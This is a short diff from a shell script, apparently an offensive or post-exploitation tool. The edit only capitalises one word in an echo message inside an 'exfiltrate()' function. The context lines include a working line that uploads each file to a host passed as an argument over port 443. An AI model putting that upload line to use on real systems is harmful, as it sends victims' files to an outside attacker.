@@ -155,7 +155,7 @@ exfiltrate()
 			$dload -F "data=@$file" $1:443
 		done
 	else
-		echo -e "\n### command not specified. Exfiltrate manually ###\n"
+		echo -e "\n### Command not specified. Exfiltrate manually ###\n"
 	fi
 }
 
